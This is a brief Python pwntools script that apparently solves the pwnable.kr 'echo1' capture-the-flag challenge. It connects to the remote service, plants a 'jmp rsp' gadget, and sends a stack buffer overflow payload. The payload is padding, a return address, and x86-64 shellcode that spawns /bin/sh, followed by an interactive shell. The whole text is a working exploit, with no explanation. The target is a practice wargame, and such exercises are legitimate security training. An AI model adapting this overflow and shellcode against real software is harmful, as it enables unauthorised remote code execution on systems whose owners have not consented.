#!/usr/bin/python

from pwn import *

c = process("echo1")
c = remote("pwnable.kr", 9010)
#gdb.attach(c)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

c.sendline(asm("jmp rsp",arch='amd64',os='linux'))
c.sendline("1")

offset = cyclic_find(0x6161616c)
payload = "a"*40 + p64(0x6020A0) + shellcode

c.sendline(payload)

c.interactive()
